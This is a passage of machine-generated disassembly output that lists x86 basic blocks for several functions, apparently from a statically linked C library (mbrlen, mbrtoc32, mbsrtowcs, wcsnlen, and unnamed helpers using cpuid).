0xb0950fe:	ret	
None
|
|
|
v
0xb095072:	cmp	esi, 0x49
0xb095075:	jne	0xb0950a8
None
|
|
|
v
0xb0952e0:	lea	eax, dword ptr [ebx - 0x49399]
0xb0952e6:	mov	dword ptr [esp + 4], eax
0xb0952ea:	lea	eax, dword ptr [ebx - 0x4937b]
0xb0952f0:	mov	dword ptr [esp], eax
0xb0952f3:	call	0xb027820
None
|
|
|
v
0xb09522c:	mov	eax, dword ptr [esp + 0x1c]
0xb095230:	mov	ebp, dword ptr [esp + 0x18]
0xb095234:	sub	eax, 0xb9
0xb095239:	sub	eax, dword ptr [esp + 0x14]
0xb09523d:	je	0xb095288
None
|
|
|
v
0xb09520c:	cmp	esi, 3
0xb09520f:	je	0xb09522c
None
|
|
|
v
0xb095278:	cmp	eax, 4
0xb09527b:	nop	
0xb09527c:	lea	esi, dword ptr [esi]
0xb095280:	jne	0xb0951d2
None
|
|
|
v
0xb09513e:	shr	dword ptr [esp + 0x18], 8
0xb095143:	mov	eax, dword ptr [esp + 0x18]
0xb095147:	test	eax, eax
0xb095149:	jne	0xb095058
None
|
|
|
v
0xb095286:	jmp	0xb09522c
None
|
|
|
v
0xb0950cc:	shr	eax, 1
0xb0950ce:	mov	edx, esi
0xb0950d0:	lea	ecx, dword ptr [edi + eax*8]
0xb0950d3:	cmp	dl, byte ptr [ecx]
0xb0950d5:	je	0xb095100
None
|
|
|
v
0xb09521e:	test	esi, esi
0xb095220:	je	0xb09522c
None
|
|
|
v
0xb0950c0:	cmp	dword ptr [esp + 0x10], eax
0xb0950c4:	mov	ebp, eax
0xb0950c6:	jae	0xb0950e4
None
|
|
|
v
0xb095217:	cmp	dword ptr [esp + 0x10], 2
0xb09521c:	jne	0xb095222
None
|
|
|
v
0xb09526a:	cmp	eax, 3
0xb09526d:	jne	0xb0951c9
None
|
|
|
v
0xb0950b8:	mov	eax, dword ptr [esp + 0x10]
0xb0950bc:	add	eax, ebp
0xb0950be:	jmp	0xb0950cc
None
|
|
|
v
0xb095211:	mov	edx, edi
0xb095213:	test	dl, dl
0xb095215:	je	0xb095222
None
|
|
|
v
0xb09514f:	jmp	0xb0950f5
None
|
|
|
v
0xb095273:	jmp	0xb09522c
None
|
|
|
v
0xb095022:	mov	eax, dword ptr [esp + 0x1c]
0xb095026:	mov	edx, 0x55555556
0xb09502b:	lea	ecx, dword ptr [eax - 0xb9]
0xb095031:	mov	eax, ecx
0xb095033:	imul	edx
0xb095035:	sar	ecx, 0x1f
0xb095038:	sub	edx, ecx
0xb09503a:	lea	eax, dword ptr [edx + edx*2]
0xb09503d:	mov	edx, dword ptr [esp + 0x18]
0xb095041:	mov	dword ptr [esp + 0x14], eax
0xb095045:	test	edx, edx
0xb095047:	je	0xb0950f5
None
|
|
|
v
0xb0951c9:	cmp	esi, 0xc
0xb0951cc:	je	0xb095278
None
|
|
|
v
0xb095111:	mov	eax, dword ptr [esp + 0x40]
0xb095115:	shr	dword ptr [esp + 0x18], 8
0xb09511a:	mov	byte ptr [eax], 1
0xb09511d:	mov	eax, dword ptr [esp + 0x18]
0xb095121:	test	eax, eax
0xb095123:	jne	0xb095058
None
|
|
|
v
0xb09524d:	mov	eax, ebp
0xb09524f:	add	esp, 0x2c
0xb095252:	and	eax, 0xfff
0xb095257:	pop	ebx
0xb095258:	add	eax, 1
0xb09525b:	pop	esi
0xb09525c:	pop	edi
0xb09525d:	pop	ebp
0xb09525e:	ret	
None
|
|
|
v
0xb0952c1:	mov	eax, ebp
0xb0952c3:	shr	eax, 0x16
0xb0952c6:	add	eax, 1
0xb0952c9:	jmp	0xb0950f7
None
|
|
|
v
0xb0951c0:	cmp	esi, 9
0xb0951c3:	je	0xb09526a
None
|
|
|
v
0xb095130:	mov	eax, dword ptr [esp + 0x44]
0xb095134:	cmp	dword ptr [esp + 0x14], 9
0xb095139:	mov	byte ptr [eax], 1
0xb09513c:	je	0xb0950f5
None
|
|
|
v
0xb095222:	cmp	esi, 6
0xb095225:	jne	0xb0951c0
None
|
|
|
v
0xb0951ab:	xor	si, si
0xb0951ae:	mov	dword ptr [esp + 0x18], ebp
0xb0951b2:	mov	ebp, esi
0xb0951b4:	mov	esi, dword ptr [esp + 0x14]
0xb0951b8:	mov	dword ptr [esp + 0x10], edx
0xb0951bc:	jmp	0xb0951f5
None
|
|
|
v
0xb09518a:	movzx	eax, byte ptr [ecx + 2]
0xb09518e:	jmp	0xb0950f7
None
|
|
|
v
0xb09508b:	cmp	dword ptr [ebx + 0x3658], 0xf
0xb095092:	jne	0xb095158
None
|
|
|
v
0xb0952b8:	movzx	eax, byte ptr [ecx + 1]
0xb0952bc:	jmp	0xb0950f7
None
|
|
|
v
0xb0950a8:	xor	edx, edx
0xb0950aa:	mov	ebp, 0x44
0xb0950af:	mov	dword ptr [esp + 0x10], edx
0xb0950b3:	nop	
0xb0950b4:	lea	esi, dword ptr [esi]
0xb0950b8:	mov	eax, dword ptr [esp + 0x10]
0xb0950bc:	add	eax, ebp
0xb0950be:	jmp	0xb0950cc
None
|
|
|
v
0xb09523f:	cmp	eax, 1
0xb095242:	je	0xb0952c1
None
|
|
|
v
0xb0950e4:	shr	dword ptr [esp + 0x18], 8
0xb0950e9:	mov	eax, dword ptr [esp + 0x18]
0xb0950ed:	test	eax, eax
0xb0950ef:	jne	0xb095058
None
|
|
|
v
0xb095000:	push	ebp
0xb095001:	push	edi
0xb095002:	push	esi
0xb095003:	push	ebx
0xb095004:	sub	esp, 0x2c
0xb095007:	call	0xb1267db
None
|
|
|
v
0xb095193:	mov	eax, 4
0xb095198:	xor	ecx, ecx
0xb09519a:	xchg	ebp, ebx
0xb09519c:	cpuid	
0xb09519e:	xchg	ebp, ebx
0xb0951a0:	mov	edx, eax
0xb0951a2:	and	edx, 0x1f
0xb0951a5:	je	0xb0950f5
None
|
|
|
v
0xb0952ce:	lea	eax, dword ptr [ebx - 0x49352]
0xb0952d4:	mov	dword ptr [esp + 0xc], eax
0xb0952d8:	mov	dword ptr [esp + 8], 0xe0
0xb0952e0:	lea	eax, dword ptr [ebx - 0x49399]
0xb0952e6:	mov	dword ptr [esp + 4], eax
0xb0952ea:	lea	eax, dword ptr [ebx - 0x4937b]
0xb0952f0:	mov	dword ptr [esp], eax
0xb0952f3:	call	0xb027820
None
|
|
|
v
0xb0950f5:	xor	eax, eax
0xb0950f7:	add	esp, 0x2c
0xb0950fa:	pop	ebx
0xb0950fb:	pop	esi
0xb0950fc:	pop	edi
0xb0950fd:	pop	ebp
0xb0950fe:	ret	
None
|
|
|
v
0xb095181:	cmp	eax, 2
0xb095184:	jne	0xb0952f8
None
|
|
|
v
0xb095066:	cmp	esi, 0xff
0xb09506c:	je	0xb095193
None
|
|
|
v
0xb095288:	mov	edx, ebp
0xb09528a:	mov	eax, ebp
0xb09528c:	shr	edx, 0x16
0xb09528f:	and	eax, 0xfff
0xb095294:	add	eax, 1
0xb095297:	add	edx, 1
0xb09529a:	imul	edx, eax
0xb09529d:	add	ecx, 1
0xb0952a0:	mov	eax, ebp
0xb0952a2:	shr	eax, 0xc
0xb0952a5:	and	eax, 0x3ff
0xb0952aa:	imul	edx, ecx
0xb0952ad:	add	eax, 1
0xb0952b0:	imul	eax, edx
0xb0952b3:	jmp	0xb0950f7
None
|
|
|
v
0xb09500c:	add	ebx, 0x115ff4
0xb095012:	test	edx, edx
0xb095014:	mov	dword ptr [esp + 0x1c], eax
0xb095018:	mov	dword ptr [esp + 0x18], edx
0xb09501c:	js	0xb0950f5
None
|
|
|
v
0xb095098:	sub	dword ptr [esp + 0x1c], 3
0xb09509d:	mov	dword ptr [esp + 0x14], 6
0xb0950a5:	lea	esi, dword ptr [esi]
0xb0950a8:	xor	edx, edx
0xb0950aa:	mov	ebp, 0x44
0xb0950af:	mov	dword ptr [esp + 0x10], edx
0xb0950b3:	nop	
0xb0950b4:	lea	esi, dword ptr [esi]
0xb0950b8:	mov	eax, dword ptr [esp + 0x10]
0xb0950bc:	add	eax, ebp
0xb0950be:	jmp	0xb0950cc
None
|
|
|
v
0xb095244:	cmp	eax, 2
0xb095247:	jne	0xb0952ce
None
|
|
|
v
0xb09504d:	lea	edi, dword ptr [ebx - 0x4eb40]
0xb095053:	nop	
0xb095054:	lea	esi, dword ptr [esi]
0xb095058:	movzx	esi, byte ptr [esp + 0x18]
0xb09505d:	cmp	esi, 0x40
0xb095060:	je	0xb095130
None
|
|
|
v
0xb095205:	cmp	dword ptr [esp + 0x10], 1
0xb09520a:	jne	0xb095211
None
|
|
|
v
0xb095100:	movzx	eax, byte ptr [ecx + 3]
0xb095104:	movzx	edx, al
0xb095107:	cmp	edx, dword ptr [esp + 0x14]
0xb09510b:	je	0xb095165
None
|
|
|
v
0xb0950d7:	jb	0xb0950c0
None
|
|
|
v
0xb095165:	mov	eax, dword ptr [esp + 0x1c]
0xb095169:	sub	eax, 0xb9
0xb09516e:	sub	eax, dword ptr [esp + 0x14]
0xb095172:	je	0xb09525f
None
|
|
|
v
0xb095058:	movzx	esi, byte ptr [esp + 0x18]
0xb09505d:	cmp	esi, 0x40
0xb095060:	je	0xb095130
None
|
|
|
v
0xb095227:	cmp	eax, 2
0xb09522a:	jne	0xb0951c0
None
|
|
|
v
0xb0950c8:	add	eax, dword ptr [esp + 0x10]
0xb0950cc:	shr	eax, 1
0xb0950ce:	mov	edx, esi
0xb0950d0:	lea	ecx, dword ptr [edi + eax*8]
0xb0950d3:	cmp	dl, byte ptr [ecx]
0xb0950d5:	je	0xb095100
None
|
|
|
v
0xb0951f5:	shr	eax, 5
0xb0951f8:	and	eax, 7
0xb0951fb:	cmp	eax, 1
0xb0951fe:	sete	dl
0xb095201:	mov	edi, edx
0xb095203:	jne	0xb095222
None
|
|
|
v
0xb095158:	mov	dword ptr [esp + 0x14], 9
0xb095160:	jmp	0xb0950a8
None
|
|
|
v
0xb0952f8:	lea	eax, dword ptr [ebx - 0x49352]
0xb0952fe:	mov	dword ptr [esp + 0xc], eax
0xb095302:	mov	dword ptr [esp + 8], 0x11d
0xb09530a:	jmp	0xb0952e0
None
|
|
|
v
0xb095077:	cmp	dword ptr [esp + 0x14], 9
0xb09507c:	jne	0xb0950a8
None
|
|
|
v
0xb09507e:	cmp	dword ptr [ebx + 0x365c], 6
0xb095085:	jne	0xb095158
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b095610
TOTAL BLOCKS :37
0xb0953f0:	mov	edx, dword ptr [esp + 0x1c]
0xb0953f4:	xor	eax, eax
0xb0953f6:	sub	edx, 0xbf
0xb0953fc:	cmp	edx, 5
0xb0953ff:	ja	0xb095408
None
|
|
|
v
0xb095410:	add	esp, 0x30
0xb095413:	xor	eax, eax
0xb095415:	pop	esi
0xb095416:	pop	edi
0xb095417:	pop	ebp
0xb095418:	ret	
None
|
|
|
v
0xb09560a:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb095660:	mov	edx, dword ptr [ebx + 0x3624]
0xb095666:	add	esp, 4
0xb095669:	mov	eax, esi
0xb09566b:	pop	ebx
0xb09566c:	pop	esi
0xb09566d:	jmp	0xb095310
None
|
|
|
v
0xb095640:	call	0xb019e10
None
|
|
|
v
0xb0955e0:	lea	eax, dword ptr [ebx - 0x4935d]
0xb0955e6:	mov	dword ptr [esp + 0xc], eax
0xb0955ea:	lea	eax, dword ptr [ebx - 0x49399]
0xb0955f0:	mov	dword ptr [esp + 4], eax
0xb0955f4:	lea	eax, dword ptr [ebx - 0x4936f]
0xb0955fa:	mov	dword ptr [esp + 8], 0x1dc
0xb095602:	mov	dword ptr [esp], eax
0xb095605:	call	0xb027820
None
|
|
|
v
0xb0953bb:	mov	eax, 2
0xb0953c0:	xchg	ebp, ebx
0xb0953c2:	cpuid	
0xb0953c4:	xchg	ebp, ebx
0xb0953c6:	cmp	dword ptr [esp + 8], 1
0xb0953cb:	mov	dword ptr [esp + 0x14], edx
0xb0953cf:	mov	dword ptr [esp + 0x10], ecx
0xb0953d3:	mov	dword ptr [esp + 0xc], ebp
0xb0953d7:	jne	0xb095348
None
|
|
|
v
0xb095610:	push	esi
0xb095611:	push	ebx
0xb095612:	call	0xb1267db
None
|
|
|
v
0xb095323:	mov	ebp, 1
0xb095328:	mov	byte ptr [esp + 0x2e], 0
0xb09532d:	lea	esi, dword ptr [esp + 0x2e]
0xb095331:	mov	byte ptr [esp + 0x2f], 0
0xb095336:	lea	edi, dword ptr [esp + 0x2f]
0xb09533a:	mov	dword ptr [esp + 0x18], 1
0xb095342:	mov	dword ptr [esp + 8], ebp
0xb095346:	jmp	0xb0953bb
None
|
|
|
v
0xb095638:	add	esp, 4
0xb09563b:	xor	eax, eax
0xb09563d:	pop	ebx
0xb09563e:	pop	esi
0xb09563f:	ret	
None
|
|
|
v
0xb09547c:	mov	eax, dword ptr [ebx + edi*4 - 0x4ec00]
0xb095483:	add	eax, ebx
0xb095485:	jmp	eax
None
|
|
|
v
0xb09545f:	xchg	esi, ebx
0xb095461:	cpuid	
0xb095463:	xchg	esi, ebx
0xb095465:	cmp	edi, 0xbb
0xb09546b:	jle	0xb095498
None
|
|
|
v
0xb09546d:	sub	edi, 0xbc
0xb095473:	cmp	edi, 8
0xb095476:	ja	0xb0955e0
None
|
|
|
v
0xb095401:	movzx	eax, byte ptr [esp + 0x2e]
0xb095406:	neg	eax
0xb095408:	add	esp, 0x30
0xb09540b:	pop	esi
0xb09540c:	pop	edi
0xb09540d:	pop	ebp
0xb09540e:	ret	
None
|
|
|
v
0xb095488:	xor	eax, eax
0xb09548a:	add	esp, 0x1c
0xb09548d:	pop	ebx
0xb09548e:	pop	esi
0xb09548f:	pop	edi
0xb095490:	pop	ebp
0xb095491:	ret	
None
|
|
|
v
0xb0953dd:	movzx	ecx, al
0xb0953e0:	xor	al, al
0xb0953e2:	mov	dword ptr [esp + 0x18], ecx
0xb0953e6:	jmp	0xb095348
None
|
|
|
v
0xb095394:	mov	edx, dword ptr [esp + 0x14]
0xb095398:	mov	eax, ebp
0xb09539a:	mov	dword ptr [esp + 4], esi
0xb09539e:	mov	dword ptr [esp], edi
0xb0953a1:	call	0xb095000
None
|
|
|
v
0xb0953b7:	mov	dword ptr [esp + 8], eax
0xb0953bb:	mov	eax, 2
0xb0953c0:	xchg	ebp, ebx
0xb0953c2:	cpuid	
0xb0953c4:	xchg	ebp, ebx
0xb0953c6:	cmp	dword ptr [esp + 8], 1
0xb0953cb:	mov	dword ptr [esp + 0x14], edx
0xb0953cf:	mov	dword ptr [esp + 0x10], ecx
0xb0953d3:	mov	dword ptr [esp + 0xc], ebp
0xb0953d7:	jne	0xb095348
None
|
|
|
v
0xb095650:	add	esp, 4
0xb095653:	mov	eax, esi
0xb095655:	pop	ebx
0xb095656:	pop	esi
0xb095657:	jmp	0xb095420
None
|
|
|
v
0xb095435:	add	ebx, 0x115bcb
0xb09543b:	xchg	ebp, ebx
0xb09543d:	cpuid	
0xb09543f:	xchg	ebp, ebx
0xb095441:	cmp	edi, 0xc4
0xb095447:	jg	0xb095488
None
|
|
|
v
0xb095420:	push	ebp
0xb095421:	push	edi
0xb095422:	mov	edi, eax
0xb095424:	push	esi
0xb095425:	mov	esi, 0x80000000
0xb09542a:	push	ebx
0xb09542b:	mov	eax, esi
0xb09542d:	sub	esp, 0x1c
0xb095430:	call	0xb1267db
None
|
|
|
v
0xb09562e:	cmp	edx, 1
0xb095631:	je	0xb095660
None
|
|
|
v
0xb095390:	test	eax, eax
0xb095392:	jne	0xb095408
None
|
|
|
v
0xb095449:	mov	esi, eax
0xb09544b:	xor	eax, eax
0xb09544d:	cmp	edi, 0xbf
0xb095453:	setge	al
0xb095456:	sub	eax, 0x7ffffffb
0xb09545b:	cmp	eax, esi
0xb09545d:	ja	0xb095488
None
|
|
|
v
0xb09535c:	test	eax, eax
0xb09535e:	jne	0xb095408
None
|
|
|
v
0xb095376:	test	eax, eax
0xb095378:	jne	0xb095408
None
|
|
|
v
0xb095408:	add	esp, 0x30
0xb09540b:	pop	esi
0xb09540c:	pop	edi
0xb09540d:	pop	ebp
0xb09540e:	ret	
None
|
|
|
v
0xb095310:	push	ebp
0xb095311:	push	edi
0xb095312:	push	esi
0xb095313:	sub	esp, 0x30
0xb095316:	cmp	edx, 1
0xb095319:	mov	dword ptr [esp + 0x1c], eax
0xb09531d:	jbe	0xb095410
None
|
|
|
v
0xb095633:	cmp	edx, 2
0xb095636:	je	0xb095650
None
|
|
|
v
0xb095645:	mov	edx, dword ptr [ebx + 0x3620]
0xb09564b:	jmp	0xb09562e
None
|
|
|
v
0xb0953a6:	test	eax, eax
0xb0953a8:	jne	0xb095408
None
|
|
|
v
0xb095498:	add	edi, 3
0xb09549b:	mov	ecx, edx
0xb09549d:	jmp	0xb09546d
None
|
|
|
v
0xb095364:	mov	edx, dword ptr [esp + 0xc]
0xb095368:	mov	eax, ebp
0xb09536a:	mov	dword ptr [esp + 4], esi
0xb09536e:	mov	dword ptr [esp], edi
0xb095371:	call	0xb095000
None
|
|
|
v
0xb0953aa:	mov	ecx, dword ptr [esp + 8]
0xb0953ae:	cmp	dword ptr [esp + 0x18], ecx
0xb0953b2:	lea	eax, dword ptr [ecx + 1]
0xb0953b5:	jbe	0xb0953f0
None
|
|
|
v
0xb095617:	add	ebx, 0x1159e9
0xb09561d:	sub	esp, 4
0xb095620:	mov	esi, dword ptr [esp + 0x10]
0xb095624:	mov	edx, dword ptr [ebx + 0x3620]
0xb09562a:	test	edx, edx
0xb09562c:	je	0xb095640
None
|
|
|
v
0xb095348:	mov	ebp, dword ptr [esp + 0x1c]
0xb09534c:	mov	edx, eax
0xb09534e:	mov	dword ptr [esp + 4], esi
0xb095352:	mov	dword ptr [esp], edi
0xb095355:	mov	eax, ebp
0xb095357:	call	0xb095000
None
|
|
|
v
0xb09537e:	mov	edx, dword ptr [esp + 0x10]
0xb095382:	mov	eax, ebp
0xb095384:	mov	dword ptr [esp + 4], esi
0xb095388:	mov	dword ptr [esp], edi
0xb09538b:	call	0xb095000
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:mbrlen
TOTAL BLOCKS :3
0xb096360:	push	ebx
0xb096361:	call	0xb1267db
None
|
|
|
v
0xb096366:	add	ebx, 0x114c9a
0xb09636c:	sub	esp, 0x18
0xb09636f:	mov	eax, dword ptr [esp + 0x28]
0xb096373:	mov	dword ptr [esp], 0
0xb09637a:	test	eax, eax
0xb09637c:	lea	edx, dword ptr [ebx + 0x1a60]
0xb096382:	cmove	eax, edx
0xb096385:	mov	dword ptr [esp + 0xc], eax
0xb096389:	mov	eax, dword ptr [esp + 0x24]
0xb09638d:	mov	dword ptr [esp + 8], eax
0xb096391:	mov	eax, dword ptr [esp + 0x20]
0xb096395:	mov	dword ptr [esp + 4], eax
0xb096399:	call	0xb0963b0
None
|
|
|
v
0xb09639e:	add	esp, 0x18
0xb0963a1:	pop	ebx
0xb0963a2:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:mbrtoc32
TOTAL BLOCKS :31
0xb0965cb:	lea	eax, dword ptr [ebx - 0x49337]
0xb0965d1:	mov	dword ptr [esp + 0xc], eax
0xb0965d5:	lea	eax, dword ptr [ebx - 0x49341]
0xb0965db:	mov	dword ptr [esp + 4], eax
0xb0965df:	lea	eax, dword ptr [ebx - 0x4421c]
0xb0965e5:	mov	dword ptr [esp + 8], 0x67
0xb0965ed:	mov	dword ptr [esp], eax
0xb0965f0:	call	0xb027820
None
|
|
|
v
0xb096459:	mov	ecx, dword ptr [eax]
0xb09645b:	mov	ebp, dword ptr [ecx + 0x14]
0xb09645e:	mov	ecx, dword ptr [ecx]
0xb096460:	test	ecx, ecx
0xb096462:	je	0xb09646e
None
|
|
|
v
0xb0964e3:	mov	edx, dword ptr [esi]
0xb0964e5:	test	edx, edx
0xb0964e7:	jne	0xb096538
None
|
|
|
v
0xb0963bc:	add	ebx, 0x114c44
0xb0963c2:	mov	esi, dword ptr [esp + 0x80]
0xb0963c9:	lea	edx, dword ptr [esp + 0x30]
0xb0963cd:	mov	eax, dword ptr [esp + 0x8c]
0xb0963d4:	mov	edi, dword ptr [esp + 0x84]
0xb0963db:	mov	dword ptr [esp + 0x48], 0
0xb0963e3:	test	esi, esi
0xb0963e5:	cmove	esi, edx
0xb0963e8:	test	eax, eax
0xb0963ea:	lea	ecx, dword ptr [ebx + 0x1a68]
0xb0963f0:	cmove	eax, ecx
0xb0963f3:	test	edi, edi
0xb0963f5:	mov	dword ptr [esp + 0x4c], 1
0xb0963fd:	mov	dword ptr [esp + 0x44], 1
0xb096405:	mov	dword ptr [esp + 0x50], eax
0xb096409:	mov	dword ptr [esp + 0x5c], 0
0xb096411:	je	0xb096548
None
|
|
|
v
0xb09656d:	lea	eax, dword ptr [ebx - 0x49337]
0xb096573:	mov	dword ptr [esp + 0xc], eax
0xb096577:	lea	eax, dword ptr [ebx - 0x49341]
0xb09657d:	mov	dword ptr [esp + 4], eax
0xb096581:	lea	eax, dword ptr [ebx - 0x442bc]
0xb096587:	mov	dword ptr [esp + 8], 0x5e
0xb09658f:	mov	dword ptr [esp], eax
0xb096592:	call	0xb027820
None
|
|
|
v
0xb0964dd:	cmp	dword ptr [esp + 0x3c], esi
0xb0964e1:	je	0xb096538
None
|
|
|
v
0xb0964e9:	mov	eax, dword ptr [esp + 0x50]
0xb0964ed:	mov	eax, dword ptr [eax]
0xb0964ef:	test	eax, eax
0xb0964f1:	jne	0xb0965cb
None
|
|
|
v
0xb0964f7:	add	esp, 0x6c
0xb0964fa:	xor	eax, eax
0xb0964fc:	pop	ebx
0xb0964fd:	pop	esi
0xb0964fe:	pop	edi
0xb0964ff:	pop	ebp
0xb096500:	ret	
None
|
|
|
v
0xb096597:	cmp	edi, 0xff
0xb09659a:	mov	dword ptr [esp + 0x24], 0xffffffff
0xb0965a2:	jne	0xb096459
None
|
|
|
v
0xb09647e:	mov	eax, dword ptr [esp + 0x24]
0xb096482:	lea	ecx, dword ptr [esp + 0x34]
0xb096486:	mov	dword ptr [esp + 0x14], ecx
0xb09648a:	lea	ecx, dword ptr [esp + 0x38]
0xb09648e:	mov	dword ptr [esp + 8], ecx
0xb096492:	lea	ecx, dword ptr [esp + 0x3c]
0xb096496:	mov	dword ptr [esp + 0x1c], 1
0xb09649e:	mov	dword ptr [esp + 0xc], eax
0xb0964a2:	mov	eax, dword ptr [esp + 0x28]
0xb0964a6:	mov	dword ptr [esp + 0x18], 0
0xb0964ae:	mov	dword ptr [esp + 0x10], 0
0xb0964b6:	mov	dword ptr [esp + 4], ecx
0xb0964ba:	mov	eax, dword ptr [eax]
0xb0964bc:	mov	dword ptr [esp], eax
0xb0964bf:	call	ebp
None
|
|
|
v
0xb096417:	lea	eax, dword ptr [esi + 4]
0xb09641a:	mov	edx, dword ptr gs:[0]
0xb096421:	mov	dword ptr [esp + 0x40], eax
0xb096425:	mov	eax, dword ptr [ebx - 0x134]
0xb09642b:	mov	dword ptr [esp + 0x3c], esi
0xb09642f:	mov	eax, dword ptr [edx + eax]
0xb096432:	mov	ebp, dword ptr [eax]
0xb096434:	mov	eax, dword ptr [ebp + 0x14]
0xb096437:	test	eax, eax
0xb096439:	je	0xb0965ad
None
|
|
|
v
0xb09643f:	mov	eax, dword ptr [ebp + 0x14]
0xb096442:	mov	ecx, edi
0xb096444:	add	ecx, dword ptr [esp + 0x88]
0xb09644b:	mov	dword ptr [esp + 0x38], edi
0xb09644f:	mov	dword ptr [esp + 0x24], ecx
0xb096453:	jb	0xb096597
None
|
|
|
v
0xb096519:	mov	eax, dword ptr [ebx - 0xdc]
0xb09651f:	mov	dword ptr [edx + eax], 0x54
0xb096526:	add	esp, 0x6c
0xb096529:	mov	eax, 0xffffffff
0xb09652e:	pop	ebx
0xb09652f:	pop	esi
0xb096530:	pop	edi
0xb096531:	pop	ebp
0xb096532:	ret	
None
|
|
|
v
0xb0965f5:	lea	eax, dword ptr [ebx - 0x178c]
0xb0965fb:	jmp	0xb096442
None
|
|
|
v
0xb0965a8:	jmp	0xb096519
None
|
|
|
v
0xb0964cc:	lea	ecx, dword ptr [eax - 6]
0xb0964cf:	cmp	ecx, 1
0xb0964d2:	jbe	0xb096508
None
|
|
|
v
0xb09646e:	mov	dword ptr [esp], ebp
0xb096471:	mov	dword ptr [esp + 0x2c], edx
0xb096475:	mov	dword ptr [esp + 0x28], eax
0xb096479:	call	0xb123900
None
|
|
|
v
0xb096510:	test	eax, eax
0xb096512:	je	0xb0964dd
None
|
|
|
v
0xb0965b7:	mov	eax, ebp
0xb0965b9:	mov	dword ptr [esp + 0x24], edx
0xb0965bd:	call	0xb0a3cb0
None
|
|
|
v
0xb096560:	add	esp, 0x6c
0xb096563:	mov	eax, 0xfffffffe
0xb096568:	pop	ebx
0xb096569:	pop	esi
0xb09656a:	pop	edi
0xb09656b:	pop	ebp
0xb09656c:	ret	
None
|
|
|
v
0xb096464:	ror	ebp, 9
0xb096467:	xor	ebp, dword ptr gs:[0x18]
0xb09646e:	mov	dword ptr [esp], ebp
0xb096471:	mov	dword ptr [esp + 0x2c], edx
0xb096475:	mov	dword ptr [esp + 0x28], eax
0xb096479:	call	0xb123900
None
|
|
|
v
0xb096514:	cmp	eax, 7
0xb096517:	je	0xb096560
None
|
|
|
v
0xb0964c1:	mov	edx, dword ptr [esp + 0x2c]
0xb0964c5:	test	eax, 0xfffffffb
0xb0964ca:	je	0xb096508
None
|
|
|
v
0xb096548:	mov	esi, edx
0xb09654a:	mov	dword ptr [esp + 0x88], 1
0xb096555:	lea	edi, dword ptr [ebx - 0x4aa73]
0xb09655b:	jmp	0xb096417
None
|
|
|
v
0xb0965c2:	mov	edx, dword ptr [esp + 0x24]
0xb0965c6:	jmp	0xb09643f
None
|
|
|
v
0xb096538:	mov	eax, dword ptr [esp + 0x38]
0xb09653c:	add	esp, 0x6c
0xb09653f:	pop	ebx
0xb096540:	pop	esi
0xb096541:	sub	eax, edi
0xb096543:	pop	edi
0xb096544:	pop	ebp
0xb096545:	ret	
None
|
|
|
v
0xb096442:	mov	ecx, edi
0xb096444:	add	ecx, dword ptr [esp + 0x88]
0xb09644b:	mov	dword ptr [esp + 0x38], edi
0xb09644f:	mov	dword ptr [esp + 0x24], ecx
0xb096453:	jb	0xb096597
None
|
|
|
v
0xb096508:	lea	ecx, dword ptr [eax - 4]
0xb09650b:	cmp	ecx, 1
0xb09650e:	jbe	0xb0964dd
None
|
|
|
v
0xb0964d4:	cmp	eax, 5
0xb0964d7:	jne	0xb09656d
None
|
|
|
v
0xb0965ad:	lea	eax, dword ptr [ebx - 0x1320]
0xb0965b3:	cmp	ebp, eax
0xb0965b5:	je	0xb0965f5
None
|
|
|
v
0xb0963b0:	push	ebp
0xb0963b1:	push	edi
0xb0963b2:	push	esi
0xb0963b3:	push	ebx
0xb0963b4:	sub	esp, 0x6c
0xb0963b7:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:mbsrtowcs
TOTAL BLOCKS :3
0xb096882:	add	esp, 0x28
0xb096885:	pop	ebx
0xb096886:	ret	
None
|
|
|
v
0xb096830:	push	ebx
0xb096831:	mov	ecx, dword ptr gs:[0]
0xb096838:	call	0xb1267db
None
|
|
|
v
0xb09683d:	add	ebx, 0x1147c3
0xb096843:	sub	esp, 0x28
0xb096846:	mov	eax, dword ptr [esp + 0x3c]
0xb09684a:	test	eax, eax
0xb09684c:	mov	edx, dword ptr [ebx - 0x134]
0xb096852:	mov	edx, dword ptr [ecx + edx]
0xb096855:	lea	ecx, dword ptr [ebx + 0x1a78]
0xb09685b:	cmove	eax, ecx
0xb09685e:	mov	dword ptr [esp + 0xc], eax
0xb096862:	mov	eax, dword ptr [esp + 0x38]
0xb096866:	mov	dword ptr [esp + 0x10], edx
0xb09686a:	mov	dword ptr [esp + 8], eax
0xb09686e:	mov	eax, dword ptr [esp + 0x34]
0xb096872:	mov	dword ptr [esp + 4], eax
0xb096876:	mov	eax, dword ptr [esp + 0x30]
0xb09687a:	mov	dword ptr [esp], eax
0xb09687d:	call	0xb0a3ff0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:wcsnlen
TOTAL BLOCKS :20
0xb0972a0:	cmp	edx, 3
0xb0972a3:	lea	eax, dword ptr [ecx + 3]
0xb0972a6:	je	0xb0972e0
None
|
|
|
v
0xb0972bf:	cmp	edx, 1
0xb0972c2:	lea	eax, dword ptr [ecx + 5]
0xb0972c5:	je	0xb0972e0
None
|
|
|
v
0xb097290:	cmp	edx, 2
0xb097293:	mov	eax, 2
0xb097298:	je	0xb0972e0
None
|
|
|
v
0xb0972d8:	mov	edi, dword ptr [esi + eax*4]
0xb0972db:	test	edi, edi
0xb0972dd:	jne	0xb0972a0
None
|
|
|
v
0xb097284:	cmp	edx, 1
0xb097287:	je	0xb0972f2
None
|
|
|
v
0xb0972df:	nop	
None
|
|
|
v
0xb0972b0:	sub	edx, 4
0xb0972b3:	lea	edi, dword ptr [ecx + 4]
0xb0972b6:	je	0xb0972e8
None
|
|
|
v
0xb0972ed:	xor	eax, eax
0xb0972ef:	nop	
0xb0972f0:	jmp	0xb0972e0
None
|
|
|
v
0xb0972b8:	mov	eax, dword ptr [esi + edi*4]
0xb0972bb:	test	eax, eax
0xb0972bd:	je	0xb0972e8
None
|
|
|
v
0xb0972c7:	cmp	dword ptr [esi + edi*4 + 4], 0
0xb0972cc:	je	0xb0972e0
None
|
|
|
v
0xb0972f2:	mov	eax, 1
0xb0972f7:	jmp	0xb0972e0
None
|
|
|
v
0xb0972d6:	mov	ecx, edi
